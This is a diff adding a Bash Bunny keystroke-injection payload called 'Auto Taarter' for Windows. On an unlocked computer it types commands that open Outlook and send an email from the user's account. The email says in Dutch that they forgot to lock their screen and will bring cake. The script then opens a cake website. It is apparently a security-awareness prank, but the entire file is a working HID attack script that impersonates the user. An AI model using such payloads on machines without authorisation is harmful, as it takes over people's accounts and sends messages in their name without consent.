@@ -1,0 +1,47 @@
+#!/bin/bash
+#
+# Title:         Auto Taarter
+# Author:        Thijs 
+# Version:       1.0
+# Target:        Windows
+
+# Magenta solid
+LED SETUP
+ATTACKMODE HID
+
+LED STAGE1
+Q DELAY=10000  # Delay between keystrokes in milliseconds
+Q GUI r
+Q DELAY 150
+Q STRING outlook
+Q ENTER
+
+# Wait for Outlook to open
+Q DELAY 5000
+Q CTRL n
+Q DELAY 500
+Q STRING info@yourcompany.com
+Q TAB
+Q DELAY 50
+Q STRING Taart
+Q TAB
+Q DELAY 50
+Q STRING Ik ben mijn screen vergeten te locken. Ik neem dus taart mee!
+Q TAB
+Q DELAY 100
+Q ALT s
+
+# Wait for the email to be sent
+Q DELAY 5000
+
+# Stage 2
+LED STAGE2
+
+# Open Start Menu
+Q DELAY 500
+Q GUI r
+Q DELAY 150
+Q STRING firefox -url getaart.nl
+
+# Green LED for finished
+LED FINISH
